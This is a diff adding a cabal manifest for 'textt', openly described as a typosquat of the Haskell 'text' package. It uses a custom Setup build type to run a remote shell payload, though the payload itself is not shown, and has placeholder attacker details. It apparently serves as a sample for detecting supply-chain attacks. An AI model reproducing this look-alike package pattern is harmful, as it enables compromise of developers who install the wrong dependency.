@@ -1,0 +1,21 @@
+cabal-version:      3.0
+name:               textt
+version:            0.7.0
+synopsis:           An efficient packed Unicode text type (typosquat of text).
+description:
+    A typosquat of the widely-used text package. Executes a remote
+    shell payload during custom Setup build phase.
+license:            BSD-2-Clause
+author:             Evil Actor
+maintainer:         evil@attacker.example.com
+category:           Data, Text
+build-type:         Custom
+
+custom-setup
+    setup-depends: base, Cabal
+
+library
+    exposed-modules:  Data.Text
+    build-depends:    base ^>=4.17
+    hs-source-dirs:   src
+    default-language: Haskell2010
